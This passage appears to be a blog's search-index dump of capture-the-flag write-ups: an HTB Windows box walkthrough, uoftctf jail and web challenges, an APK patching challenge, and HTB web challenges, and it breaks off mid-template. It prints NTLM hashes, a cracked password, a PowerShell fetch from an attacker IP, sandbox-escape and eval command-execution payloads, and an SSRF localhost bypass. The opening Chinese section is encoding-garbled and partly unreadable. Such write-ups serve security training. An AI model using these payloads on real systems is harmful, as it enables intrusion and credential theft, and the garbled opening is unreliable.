æŠŠvhdæŒ‚è½½åœ¨ è¿™ä¸ªæ–‡ä»¶å¤¹ guestmount --add /mnt/backup/WindowsImageBackup/L4mpje-PC/Backup\\ 2019-02-22\\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6 å¯ä»¥çœ‹åˆ°å·²ç»å¯ä»¥è¿›å…¥åˆ° vhdæ–‡ä»¶é‡Œè¿›è¡Œæ“ä½œã€‚æˆ‘é¦–å…ˆè¦åšçš„å°±æ˜¯èƒ½ä¸èƒ½ç›´æ¥åˆ°user desktopé‡Œæ‹¿åˆ° user.txt samdump2å¯ä»¥å®Œæˆè¿™ä¸ªä»»åŠ¡ å…³äºå“ˆå¸Œå€¼çš„åˆ©ç”¨æ–¹æ³•å¾ˆå¤šï¼Œæ—¢ç„¶SMBæ˜¯å¼€ç€çš„ å®Œå…¨å¯ä»¥ç”¨å“ˆå¸Œå€¼ä¼ é€’æ”»å‡» ç™»å½•ç³»ç»Ÿã€‚ä¸ªäººåŸå›  æˆ‘æ¯”è¾ƒå–œæ¬¢å°è¯•ç ´è§£å¯†ç  *disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::123 æ³¨æ„è¿™è¾¹ administratorå’Œ Guestæ˜¾å¾—çš„æ˜¯ disableæ­£å¸¸æ¥è¯´æ ¼å¼æ˜¯&lt;ç”¨æˆ·å&gt;:&lt;ç”¨æˆ·ID&gt;:&lt; LM hash&gt;:&lt; NT hash&gt;:&lt;ç•™è¨€&gt;:&lt;ä¸»ç›®å½•&gt;Administratorå’Œguestçš„ LM HASHå’ŒNT hashéƒ½æ˜¯ä¸€æ¨¡ä¸€æ ·ã€‚è¿™è¾¹è¦æ³¨æ„ aad3 å’Œ 31d6 éƒ½æ˜¯ä»£è¡¨ä¸ºç©ºè¯´æ˜è¿™é‡Œæ²¡æœ‰æ•°å€¼é¢˜å¤–è¯ã€‚ æˆ‘ä»¬æŠŠL4mpje çš„å“ˆå¸Œå€¼ä¸¢åˆ°crackstation.net è¿›è¡Œç ´è§£å¾—åˆ°å¸å·å¯†ç L4mpjeï¼šbureaulampje å¾ˆå¯æƒœ æˆ‘ä»¬æ²¡æœ‰ RDPï¼Œ ä½†æˆ‘ä»¬æœ‰SSHï¼ˆç‹—å¤´ï¼‰ ssh L4mpje@10.10.10.134password: bureaulampje12 æˆåŠŸæ‹¿åˆ° cmd shellç°åœ¨å¼€å§‹å‡†å¤‡ææƒã€‚ç¢°åˆ°windows æˆ‘ä¸ªäººä¹ æƒ¯æ˜¯ä¸ŠJAWL çš„è„šæœ¬æ¥çœ‹ç³»ç»Ÿçš„ä¿¡æ¯æ¥å¸®åŠ©æˆ‘ææƒã€‚ é“¾æ¥: Jawl githubåœ°å€ å› ä¸ºè¿™æ˜¯æˆ‘çš„ç¬¬ä¸€ä¸ªæ–‡ç«  æˆ‘å°±ç®€å•çš„è¯´ä¸‹ å¦‚ä½•åœ¨windowsé‡Œä¼ è¾“æ–‡ä»¶å…¶å®æ–¹å¼æœ‰å¾ˆå¤šç§ï¼Œæœ‰çš„æƒ…å†µè¿™ä¸ªå¯ä»¥ æœ‰çš„æƒ…å†µé‚£ä¸ªå¯ä»¥æˆ‘å°±ç®€å•è¯´ä¸€ä¸‹ æˆ‘ä¸ªäººå–œçˆ±çš„ä¸€ä¸ªæ–¹æ³•ã€‚powershell powershell.exe -c &quot;(new-object System.Net.WebClient).DownloadFile(&#x27;http://10.10.14.12/jaws-enum.ps1&#x27;,&#x27;C:\\Users\\L4mpje\\Desktop\\jaws-enum.ps1&#x27;)12 é¢˜å¤–è¯ç»“æŸ æ‰§è¡Œjaws-enum.ps1 powershell.exe -ExecutionPolicy Bypass -File .\\jaws-enum.ps11 å¤§æ¦‚çš„çœ‹äº†ä¸‹ å¹¶æ²¡æœ‰ä»€ä¹ˆæœ‰è¶£çš„ä¿¡æ¯ï¼Œä½†æœ‰ä¸€ä¸ªåœ°æ–¹å¼•èµ·äº†å…³æ³¨mRemoteNG å››ï¼Œææƒç¢°åˆ°é™Œç”Ÿçš„è½¯ä»¶å°±è¦ä¸ŠGoogleè¯¢é—®ï¼Œæœç„¶æˆ‘ä»¬å‘ç°äº†è¿™è½¯ä»¶å­˜åœ¨æ¯”è¾ƒå¼±çš„å¯†ç ä¿æŠ¤ç®¡ç†ã€‚åœ¨å¦å¤–ä¸€ç¯‡æ–‡ç« é‡Œ æˆ‘ä»¬å‘ç°äº†å‚¨å­˜å¯†ç çš„ç›®å½• æ˜¯ä½äºAppdataé‡Œã€‚ é“¾æ¥:æ–‡ç« ä¼ é€é—¨ è¿™é‡Œå†è¯´ç‚¹é¢˜å¤–è¯ã€‚Appdataå±äºéšè—çš„æ–‡ä»¶å¤¹ç±»å‹ æ­£å¸¸çš„dir æ˜¯æ— æ³•çœ‹è§æ–‡ä»¶å¤¹ åˆ©ç”¨ dir&#x2F;a æ¥æ˜¾ç¤ºå…¨éƒ¨çš„æ–‡ä»¶ æˆåŠŸæ‰¾åˆ°ç®¡ç†å‘˜çš„å¯†ç  åˆ©ç”¨githubä¸Šé¢çš„ä¸€ä¸ªpython è„šæœ¬ æ¥ç®—å‡ºå¯†ç  é“¾æ¥:githubä¼ é€é—¨ python3 mremote_decrypt.py -s &quot;aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==&quot;æˆåŠŸå–å¾—å¯†ç thXLHM96BeKL0ER21234 ç´§æ¥ç€ SSHç™»é™†ç®¡ç†å‘˜ å¹¶æ‹¿åˆ°root.txt","categories":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/categories/hackthebox/"}],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"}]},{"title":"CTF - uoftctf","slug":"CTF - uoftctf","date":"2007-12-30T16:00:00.000Z","updated":"2024-02-05T15:26:54.399Z","comments":true,"path":"2007/12/31/CTF - uoftctf/","permalink":"https://ik0nw.github.io/2007/12/31/CTF%20-%20uoftctf/","excerpt":"","text":"Jail - Babyâ€™s First PyJail @windex told me that jails should be sourceless. So no source for you. Certain words are filtered &#39;import&#39;, &#39;exec&#39;, &#39;eval&#39;, &#39;os&#39;, &#39;open&#39;, &#39;read&#39;, &#39;system&#39;, &#39;module&#39;, &#39;write&#39;, &#39;.&#39; By printing the __builtins__ &gt;&gt;&gt; print(dir(__builtins__))[&#x27;ArithmeticError&#x27;, &#x27;AssertionError&#x27;, &#x27;AttributeError&#x27;, &#x27;BaseException&#x27;, &#x27;BlockingIOError&#x27;, &#x27;BrokenPipeError&#x27;, &#x27;BufferError&#x27;, &#x27;BytesWarning&#x27;, &#x27;ChildProcessError&#x27;, &#x27;ConnectionAbortedError&#x27;, &#x27;ConnectionError&#x27;, &#x27;ConnectionRefusedError&#x27;, &#x27;ConnectionResetError&#x27;, &#x27;DeprecationWarning&#x27;, &#x27;EOFError&#x27;, &#x27;Ellipsis&#x27;, &#x27;EncodingWarning&#x27;, &#x27;EnvironmentError&#x27;, &#x27;Exception&#x27;, &#x27;False&#x27;, &#x27;FileExistsError&#x27;, &#x27;FileNotFoundError&#x27;, &#x27;FloatingPointError&#x27;, &#x27;FutureWarning&#x27;, &#x27;GeneratorExit&#x27;, &#x27;IOError&#x27;, &#x27;ImportError&#x27;, &#x27;ImportWarning&#x27;, &#x27;IndentationError&#x27;, &#x27;IndexError&#x27;, &#x27;InterruptedError&#x27;, &#x27;IsADirectoryError&#x27;, &#x27;KeyError&#x27;, &#x27;KeyboardInterrupt&#x27;, &#x27;LookupError&#x27;, &#x27;MemoryError&#x27;, &#x27;ModuleNotFoundError&#x27;, &#x27;NameError&#x27;, &#x27;None&#x27;, &#x27;NotADirectoryError&#x27;, &#x27;NotImplemented&#x27;, &#x27;NotImplementedError&#x27;, &#x27;OSError&#x27;, &#x27;OverflowError&#x27;, &#x27;PendingDeprecationWarning&#x27;, &#x27;PermissionError&#x27;, &#x27;ProcessLookupError&#x27;, &#x27;RecursionError&#x27;, &#x27;ReferenceError&#x27;, &#x27;ResourceWarning&#x27;, &#x27;RuntimeError&#x27;, &#x27;RuntimeWarning&#x27;, &#x27;StopAsyncIteration&#x27;, &#x27;StopIteration&#x27;, &#x27;SyntaxError&#x27;, &#x27;SyntaxWarning&#x27;, &#x27;SystemError&#x27;, &#x27;SystemExit&#x27;, &#x27;TabError&#x27;, &#x27;TimeoutError&#x27;, &#x27;True&#x27;, &#x27;TypeError&#x27;, &#x27;UnboundLocalError&#x27;, &#x27;UnicodeDecodeError&#x27;, &#x27;UnicodeEncodeError&#x27;, &#x27;UnicodeError&#x27;, &#x27;UnicodeTranslateError&#x27;, &#x27;UnicodeWarning&#x27;, &#x27;UserWarning&#x27;, &#x27;ValueError&#x27;, &#x27;Warning&#x27;, &#x27;ZeroDivisionError&#x27;, &#x27;__build_class__&#x27;, &#x27;__debug__&#x27;, &#x27;__doc__&#x27;, &#x27;__import__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__spec__&#x27;, &#x27;abs&#x27;, &#x27;aiter&#x27;, &#x27;all&#x27;, &#x27;anext&#x27;, &#x27;any&#x27;, &#x27;ascii&#x27;, &#x27;bin&#x27;, &#x27;bool&#x27;, &#x27;breakpoint&#x27;, &#x27;bytearray&#x27;, &#x27;bytes&#x27;, &#x27;callable&#x27;, &#x27;chr&#x27;, &#x27;classmethod&#x27;, &#x27;compile&#x27;, &#x27;complex&#x27;, &#x27;copyright&#x27;, &#x27;credits&#x27;, &#x27;delattr&#x27;, &#x27;dict&#x27;, &#x27;dir&#x27;, &#x27;divmod&#x27;, &#x27;enumerate&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;exit&#x27;, &#x27;filter&#x27;, &#x27;float&#x27;, &#x27;format&#x27;, &#x27;frozenset&#x27;, &#x27;getattr&#x27;, &#x27;globals&#x27;, &#x27;hasattr&#x27;, &#x27;hash&#x27;, &#x27;help&#x27;, &#x27;hex&#x27;, &#x27;id&#x27;, &#x27;input&#x27;, &#x27;int&#x27;, &#x27;isinstance&#x27;, &#x27;issubclass&#x27;, &#x27;iter&#x27;, &#x27;len&#x27;, &#x27;license&#x27;, &#x27;list&#x27;, &#x27;locals&#x27;, &#x27;map&#x27;, &#x27;max&#x27;, &#x27;memoryview&#x27;, &#x27;min&#x27;, &#x27;next&#x27;, &#x27;object&#x27;, &#x27;oct&#x27;, &#x27;open&#x27;, &#x27;ord&#x27;, &#x27;pow&#x27;, &#x27;print&#x27;, &#x27;property&#x27;, &#x27;quit&#x27;, &#x27;range&#x27;, &#x27;repr&#x27;, &#x27;reversed&#x27;, &#x27;round&#x27;, &#x27;set&#x27;, &#x27;setattr&#x27;, &#x27;slice&#x27;, &#x27;sorted&#x27;, &#x27;staticmethod&#x27;, &#x27;str&#x27;, &#x27;sum&#x27;, &#x27;super&#x27;, &#x27;tuple&#x27;, &#x27;type&#x27;, &#x27;vars&#x27;, &#x27;zip&#x27;] We are still able to use getattr to access the object even though the import is banned. And manipulate the string to avoid the blacklist detections. The solution below avoids the black list character and dots. getattr(getattr(globals()[&#x27;__builtins__&#x27;], &#x27;__im&#x27;+&#x27;port__&#x27;)(&#x27;o&#x27;+&#x27;s&#x27;), &#x27;sys&#x27;+&#x27;tem&#x27;)(&#x27;cat flag.txt&#x27;)Orgetattr(getattr(globals()[&#x27;__builtins__&#x27;], &#x27;__im&#x27;+&#x27;port__&#x27;)(&#x27;o&#x27;+&#x27;s&#x27;), &#x27;sys&#x27;+&#x27;tem&#x27;)(&#x27;cat flag&#x27;) https://www.clementi.top/2023/07/13/python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/index.html https://www.freebuf.com/articles/web/326406.html. Web - Voice Changer I made a cool app that changes your voice. Itâ€™s a web application to record voice and sent over to server side and will parse by ffmpeg. During the analyse phase using burp, the pitch parameter found to be vulnerable to command injections and the result is return back in the output. Web - The Varsity Come read our newspaper! Be sure to subscribe if you want access to the entire catalogue, including the latest issue. Source code is provided, basically after user register, it allows user to view articles. According to the source code, the flag is stored at article 10 However viewing the article 10 requires subscription which the roles is embedded in JWT. In this part of code, it provides the POST route for /article. app.post(&quot;/article&quot;, (req, res) =&gt; &#123; const token = req.cookies.token; if (token) &#123; try &#123; const decoded = jwt.verify(token, JWT_SECRET); let issue = req.body.issue; if (req.body.issue &lt; 0) &#123; return res.status(400).json(&#123; message: &quot;Invalid issue number&quot; &#125;); &#125; if (decoded.subscription !== &quot;premium&quot; &amp;&amp; issue &gt;= 9) &#123; return res .status(403) .json(&#123; message: &quot;Please subscribe to access this issue&quot; &#125;); &#125; issue = parseInt(issue); if (Number.isNaN(issue) || issue &gt; articles.length - 1) &#123; return res.status(400).json(&#123; message: &quot;Invalid issue number&quot; &#125;); &#125; return res.json(articles[issue]); .................. It seems that thereâ€™s some problem with the parseInt. Before parseInt, issue have to be less than 9 and after the parseInt we need issue to be less than 10. After some research we found that using the scientific notation able us to meet the condition. when the value of issue is we will craft the issue to be &quot;9.999e-1&quot; which will bypass the first check and after parseint the value of issues will be 9. Since the value issue now is 9, it will also bypass the second check, and return res.json(article[9]) Web - No Codefrom flask import Flask, request, jsonifyimport reapp = Flask(__name__)@app.route(&#x27;/execute&#x27;, methods=[&#x27;POST&#x27;])def execute_code(): code = request.form.get(&#x27;code&#x27;, &#x27;&#x27;) if re.match(&quot;.*[\\x20-\\x7E]+.*&quot;, code): return jsonify(&#123;&quot;output&quot;: &quot;jk lmao no code&quot;&#125;), 403 result = &quot;&quot; try: result = eval(code) except Exception as e: result = str(e) return jsonify(&#123;&quot;output&quot;: result&#125;), 200if __name__ == &quot;__main__&quot;: app.run(host=&quot;0.0.0.0&quot;, port=1337, debug=False) re.match(&quot;.*[\\x20-\\x7E]+.*&quot;, code) This regex is using the re.match() function to check if the code string contains any printable ASCII characters. Letâ€™s break down the components: .*: Matches any character (except for a newline) zero or more times. [\\x20-\\x7E]+: This is a character class that matches one or more characters within the hexadecimal range \\x20 (space) to \\x7E (tilde). This range represents the printable ASCII characters, including letters, digits, punctuation, and some special characters. By enter a new line will bypass the check of regex import requestspayload = &quot;\\n__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read()&quot;url = &quot;https://uoftctf-no-code.chals.io/execute&quot;r = requests.post(url,data=&#123;&quot;code&quot;:payload&#125;)print(r.text) &#123;&quot;output&quot;:&quot;uoftctf&#123;r3g3x_3p1c_f41L_XDDD&#125;&quot;&#125;","categories":[],"tags":[]},{"title":"HTB-Mobile-Challenge","slug":"HTB-Mobile-Challenge","date":"1998-01-01T16:00:00.000Z","updated":"2024-02-04T17:02:14.235Z","comments":true,"path":"1998/01/02/HTB-Mobile-Challenge/","permalink":"https://ik0nw.github.io/1998/01/02/HTB-Mobile-Challenge/","excerpt":"","text":"APKey This app contains some unique keys. Can you get one? Firstly, install the app to inspect the activity main page. However, face difficulties with installing through adb prompt will following errors: &#96;adb: failed to install backup.apk: Failure [-124: Failed parse during installPackageLI: Targeting R+ (version 30 and above) requires the resources.arsc of installed APKs to be stored uncompressed and aligned on a 4-byte boundary] After some research, we have to align the packet in bytes of 4 using zipalign. $ zipalign --help zipalign: symbol lookup error: zipalign: undefined symbol: _ZN11zip_archive6WriterD2Ev when trying to launch zipalign from kali linux, I have problem with error for the packet. After more research. zipalignManage to download the right package from this site. perform dpkg -i &lt;package.deb&gt; When installing we are missing android-libandroidfw package. $ sudo dpkg -i zipalign_8.1.0+r23-2_amd64.deb Selecting previously unselected package zipalign.(Reading database ... 421645 files and directories currently installed.)Preparing to unpack zipalign_8.1.0+r23-2_amd64.deb ...Unpacking zipalign (1:8.1.0+r23-2) ...dpkg: dependency problems prevent configuration of zipalign: zipalign depends on android-libandroidfw; however: Package android-libandroidfw is not installed.dpkg: error processing package zipalign (--install): dependency problems - leaving unconfiguredProcessing triggers for kali-menu (2023.4.6) ...Processing triggers for man-db (2.12.0-1) ...Errors were encountered while processing: zipalign Performa a install on the package sudo apt-get install android-libandroidfw And now we got our zipalign working $ zipalign -p 4 APKey.apk zipalign_APKEY.apk Next we can perform a check if the APK is aligned with 4 bytes Good! After realign the APK, we have to sign the application again using apksigner with the fake private key keytool -genkeypair -v -keystore my-release-key.jks -keyalg RSA - keysize 2048 -validity 10000 -alias my-alias apksigner sign --ks my-release-key.jks zipalign_APKEY.apk Manage to install the application sucessfully this time round. The application requires a authentication for a key. Decompile APKDecompile the application with apktool apktool d apkey.apk Also open it using jadx-gui Inspecting at the manifest file, found the launcher is at MainActivity &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:versionCode=&quot;1&quot; android:versionName=&quot;1.0&quot; android:compileSdkVersion=&quot;30&quot; android:compileSdkVersionCodename=&quot;11&quot; package=&quot;com.example.apkey&quot; platformBuildVersionCode=&quot;30&quot; platformBuildVersionName=&quot;11&quot;&gt; &lt;uses-sdk android:minSdkVersion=&quot;16&quot; android:targetSdkVersion=&quot;30&quot;/&gt; &lt;application android:theme=&quot;@style/Theme.APKey&quot; android:label=&quot;@string/app_name&quot; android:icon=&quot;@mipmap/ic_launcher&quot; android:allowBackup=&quot;true&quot; android:supportsRtl=&quot;true&quot; android:roundIcon=&quot;@mipmap/ic_launcher_round&quot; android:appComponentFactory=&quot;androidx.core.app.CoreComponentFactory&quot;&gt; &lt;activity android:name=&quot;com.example.apkey.MainActivity&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt; &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt; &lt;/intent-filter&gt; &lt;/activity&gt; &lt;/application&gt;&lt;/manifest&gt; As from the previous section, we notice that the login page requires 2 input box, username and password. It is declare at line 22 and 23 with object EditText This is further prove by if (MainActivity.this.f928c.getText().toString().equals(&quot;admin&quot;)) &#123;which it is checking if the user input for f928c is equal to admin. Next it create a MD5 object and hash the user provided password and check if it is equal to a2a3d412e92d896134d9c9126d756f. However this hash is uncrackable. Since it is a simple logic of EQUAL , we can modify the smali code to become NOT EQUAL. but first, we have to allocate where is the comparison in smali. From the apktool decompile folder, navigate to smali/com/example/MainActivity$a.smali About line 141, we saw the hash a2a3d412e92d896134d9c9126d756f :try_start_2 invoke-virtual &#123;p1&#125;, Ljava/security/NoSuchAlgorithmException;-&gt;printStackTrace()V const-string p1, &quot;&quot; :goto_1 const-string v1, &quot;a2a3d412e92d896134d9c9126d756f&quot; .line 2 invoke-virtual &#123;p1, v1&#125;, Ljava/lang/String;-&gt;equals(Ljava/lang/Object;)Z move-result p1 if-eqz p1, :cond_1 iget-object p1, p0, Lcom/example/apkey/MainActivity$a;-&gt;b:Lcom/example/apkey/MainActivity; A sample of code near the hash, we can see that the second line invoke-virtual &#123;p1&#125;, Ljava/security/NoSuchAlgorithmException;-&gt;printStackTrace()Vis actually the printStackTrace function corresponding to the red box. const-string p1, &quot;&quot; next it set the p1 register to an empty string. :goto_1 seems a JUMP label which if refer to the code, it is the end of catch. const-string v1, &quot;a2a3d412e92d896134d9c9126d756f&quot;. next it set the V1 register. On a side note, was curious if the register stored the address or the actual value. http://pallergabor.uw.hu/androidblog/dalvik_opcodes.html after that it perform equal function with the string and the hash invoke-virtual &#123;p1, v1&#125;, Ljava/lang/String;-&gt;equals(Ljava/lang/Object;)Z This equal function takes in 2 parameter, and return a boolean Z move-result p1 next it move the boolean result into p1. if-eqz p1, :cond_1 check if P1 is true, then it jumps to label cond_1 Which this is the critical statement that wanted to change, with a little bit help from CHATGPT. Good, we have the code now, letâ€™s save the changes. Compile the samli app using apktool $ $ apktool b APKey Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=trueI: Using Apktool 2.9.3I: Checking whether sources has changed...I: Smaling smali folder into classes.dex...I: Checking whether resources has changed...I: Building resources...I: Building apk file...I: Copying unknown files/dir...I: Built apk into: APKey/dist/APKey.apk Zipalign the 4 bytes and sign again $ zipalign -p 4 APKey.apk zipalign_APKEY.apk$ apksigner sign --ks ~/Desktop/my-release-key.jks zipalign_APKEY.apk$ adb install zipalign_APKEY.apk Performing Incremental InstallServing... Type random password, will result in not equal the hash and it actually print the flag.","categories":[],"tags":[]},{"title":"HTB Web Challenge","slug":"HTB-Web-Challenge","date":"1997-12-31T16:00:00.000Z","updated":"2024-01-03T14:20:43.538Z","comments":true,"path":"1998/01/01/HTB-Web-Challenge/","permalink":"https://ik0nw.github.io/1998/01/01/HTB-Web-Challenge/","excerpt":"","text":"Jscalc - EasyDescription In the mysterious depths of the digital sea, a specialized JavaScript calculator has been crafted by tech-savvy squids. With multiple arms and complex problem-solving skills, these cephalopod engineers use it for everything from inkjet trajectory calculations to deep-sea math. Attempt to outsmart it at your own risk! ğŸ¦‘ Poking through the website found it uses eval(), in this case, it is vulnerable directly execute javascript codes Take a look at routes, the /api/calculate accept variable called â€˜formulaâ€˜ and passed it to the calculatorHelp calculator for processing const path = require(&#x27;path&#x27;);const express = require(&#x27;express&#x27;);const router = express.Router();const Calculator = require(&#x27;../helpers/calculatorHelper&#x27;);const response = data =&gt; (&#123; message: data &#125;);router.get(&#x27;/&#x27;, (req, res) =&gt; &#123; return res.sendFile(path.resolve(&#x27;views/index.html&#x27;));&#125;);router.post(&#x27;/api/calculate&#x27;, (req, res) =&gt; &#123; let &#123; formula &#125; = req.body; if (formula) &#123; result = Calculator.calculate(formula); return res.send(response(result)); &#125; return res.send(response(&#x27;Missing parameters&#x27;));&#125;)module.exports = router;// ocd and it directly proceed with eval without sanitized the input jsmodule.exports = &#123; calculate(formula) &#123; try &#123; return eval(`(function() &#123; return $&#123; formula &#125; ;&#125;())`); &#125; catch (e) &#123; if (e instanceof SyntaxError) &#123; return &#x27;Something went wrong!&#x27;; &#125; &#125; &#125;&#125; Reading files with Node.js readFileSync can be used to read files. craft payload in one line would be require(&#x27;fs&#x27;).readFileSync(&#x27;../flag.txt&#x27;) However it seems to return an object. Modify the parameter for readFileSync to utf8 require(&#x27;fs&#x27;).readFileSync(&#x27;../flag.txt&#x27;,&#x27;utf8&#x27;) ProxyAsService - Easyapp.py app.register_blueprint(proxy_api, url_prefix=&#x27;/&#x27;)app.register_blueprint(debug, url_prefix=&#x27;/debug&#x27;) 2 route blueprint proxy_api and debug ip:port/(proxy_api)ip:port/debug(debug) route.py from flask import Blueprint, request, Response, jsonify, redirect, url_forfrom application.util import is_from_localhost, proxy_reqimport random, osSITE_NAME = &#x27;reddit.com&#x27;proxy_api = Blueprint(&#x27;proxy_api&#x27;, __name__)debug = Blueprint(&#x27;debug&#x27;, __name__)@proxy_api.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def proxy(): url = request.args.get(&#x27;url&#x27;) if not url: cat_meme_subreddits = [ &#x27;/r/cats/&#x27;, &#x27;/r/catpictures&#x27;, &#x27;/r/catvideos/&#x27; ] random_subreddit = random.choice(cat_meme_subreddits) return redirect(url_for(&#x27;.proxy&#x27;, url=random_subreddit)) target_url = f&#x27;http://&#123;SITE_NAME&#125;&#123;url&#125;&#x27; response, headers = proxy_req(target_url) return Response(response.content, response.status_code, headers.items())@debug.route(&#x27;/environment&#x27;, methods=[&#x27;GET&#x27;])@is_from_localhostdef debug_environment(): environment_info = &#123; &#x27;Environment variables&#x27;: dict(os.environ), &#x27;Request headers&#x27;: dict(request.headers) &#125; return jsonify(environment_info) Break down into 2 parts. in the default index route, if the url parameter is not provided in the request, it will be randomly assign a path to reddits. If the url is set in parameter, it will access the url through the proxy_req function @proxy_api.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def proxy(): url = request.args.get(&#x27;url&#x27;) if not url: cat_meme_subreddits = [ &#x27;/r/cats/&#x27;, &#x27;/r/catpictures&#x27;, &#x27;/r/catvideos/&#x27; ] random_subreddit = random.choice(cat_meme_subreddits) return redirect(url_for(&#x27;.proxy&#x27;, url=random_subreddit)) target_url = f&#x27;http://&#123;SITE_NAME&#125;&#123;url&#125;&#x27; response, headers = proxy_req(target_url) return Response(response.content, response.status_code, headers.items()) utils.py In this utils.py states the restriction for proxy_req functions stated previously, it will check if the url parameter contains the restricted keywords in the RESTIRCTED_URLS list. It will then act as a proxy send a request and forward the response back to user. RESTRICTED_URLS = [&#x27;localhost&#x27;, &#x27;127.&#x27;, &#x27;192.168.&#x27;, &#x27;10.&#x27;, &#x27;172.&#x27;]def is_safe_url(url): for restricted_url in RESTRICTED_URLS: if restricted_url in url: return False return Truedef is_from_localhost(func): @functools.wraps(func) def check_ip(*args, **kwargs): if request.remote_addr != &#x27;127.0.0.1&#x27;: return abort(403) return func(*args, **kwargs) return check_ipdef proxy_req(url): method = request.method headers = &#123; key: value for key, value in request.headers if key.lower() in [&#x27;x-csrf-token&#x27;, &#x27;cookie&#x27;, &#x27;referer&#x27;] &#125; data = request.get_data() response = requests.request( method, url, headers=headers, data=data, verify=False ) if not is_safe_url(url) or not is_safe_url(response.url): return abort(403) return response, headers From here, it clearly seems a SSRF challenge. But where is the flag? Checking through the docker files, the flag is hiding in the environment variable. Which we can obtain through the second part of the debug endpoints @debug.route(&#x27;/environment&#x27;, methods=[&#x27;GET&#x27;])@is_from_localhostdef debug_environment(): environment_info = &#123; &#x27;Environment variables&#x27;: dict(os.environ), &#x27;Request headers&#x27;: dict(request.headers) &#125; return jsonify(environment_info) It has to check if the request if is from localhost def is_from_localhost(func): @functools.wraps(func) def check_ip(*args, **kwargs): if request.remote_addr != &#x27;127.0.0.1&#x27;: return abort(403) return func(*args, **kwargs) return check_ip Now the task seems clearer, we have to craft a SSRF attacks, targeted to the /debug/environment and leak the environment settings that contains the flag. Firstly, we have to bypass the restriction of RESTRICTED_LIST, it can be easily bypass by using decimal to represent IP address. Hacktrick also provided other methods that represent localhost Secondly, we cannot directly input the url point to endpoint as it will embedded a reddit infront of our provided user input. Therefore we can use @ to bypass that. Therefore the full payload will be http://&lt;ip&gt;:&lt;port&gt;?url=@2130706433:&lt;port&gt;/debug/environment The server side will interpreted as http://&lt;ip&gt;:&lt;port&gt;?url=reddit@2130706433:&lt;port&gt;/debug/environment However, one interesting thing is when I setup docker in my localhost. I am able to get the flag through the payload indicate the port to be 1337 (Which docker itself exposed to 1337) http://172.17.0.1:1337/?url=@2130706433:1337/debug/environment but to the real target, I have difficulties using the same port 32436. Suspect it is a mapping of ports when expose to public IPs. Therefore have to change the payload to port 1337 http://159.65.24.125:32436/?url=@0.0.0.0:1337/debug/environment RenderQuest - Easy Youâ€™ve found a website that lets you input remote templates for rendering. Your task is to exploit this systemâ€™s vulnerabilities to access and retrieve a hidden flag. Good luck! From the description it seems like a Server Side Template Injection. In function getTpl It retrieve the page and render the page using html template. https://pkg.go.dev/html/template func (p RequestData) FetchServerInfo(command string) string &#123; out, err := exec.Command(&quot;sh&quot;, &quot;-c&quot;, command).Output() if err != nil &#123; This function is able to execute system information. Finding a way to trigger this function. It looks complicated, but we can always use chatGPT to spawn a sample html page with the go lang template. &lt;!-- File name: index.tpl --&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Sample Template&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;Welcome!&lt;/h1&gt; &lt;p&gt;This is a sample GoLang HTML template page.&lt;/p&gt; &lt;!-- Here, you can include Go template syntax to render dynamic content --&gt; &lt;p&gt;Client IP: &#123;&#123;.ClientIP&#125;&#125;&lt;/p&gt; &lt;p&gt;User Agent: &#123;&#123;.ClientUA&#125;&#125;&lt;/p&gt; &lt;p&gt;Server Hostname: &#123;&#123;.ServerInfo.Hostname&#125;&#125;&lt;/p&gt; &lt;p&gt;Server OS: &#123;&#123;.ServerInfo.OS&#125;&#125;&lt;/p&gt; &lt;p&gt;Server Kernel Version: &#123;&#123;.ServerInfo.KernelVersion&#125;&#125;&lt;/p&gt; &lt;p&gt;Server Memory: &#123;&#123;.ServerInfo.Memory&#125;&#125;&lt;/p&gt; &lt;p&gt;Location Information:&lt;/p&gt; &lt;ul&gt; &lt;li&gt;IP Version: &#123;&#123;.ClientIpInfo.IpVersion&#125;&#125;&lt;/li&gt; &lt;li&gt;IP Address: &#123;&#123;.ClientIpInfo.IpAddress&#125;&#125;&lt;/li&gt; &lt;li&gt;Latitude: &#123;&#123;.ClientIpInfo.Latitude&#125;&#125;&lt;/li&gt; &lt;li&gt;Longitude: &#123;&#123;.ClientIpInfo.Longitude&#125;&#125;&lt;/li&gt; &lt;li&gt;Country Name: &#123;&#123;.ClientIpInfo.CountryName&#125;&#125;&lt;/li&gt; &lt;li&gt;Country Code: &#123;&#123;.ClientIpInfo.CountryCode&#125;&#125;&lt;/li&gt; &lt;li&gt;Time Zone: &#123;&#123;.ClientIpInfo.TimeZone&#125;&#125;&lt;/li&gt; &lt;li&gt;Zip Code: &#123;&#123;.ClientIpInfo.ZipCode&#125;&#125;&lt;/li&gt; &lt;li&gt;City Name: &#123;&#123;.ClientIpInfo.CityName&#125;&#125;&lt;/li&gt; &lt;li&gt;Region Name: &#123;&#123;.ClientIpInfo.RegionName&#125;&#125;&lt;/li&gt; &lt;li&gt;Continent: 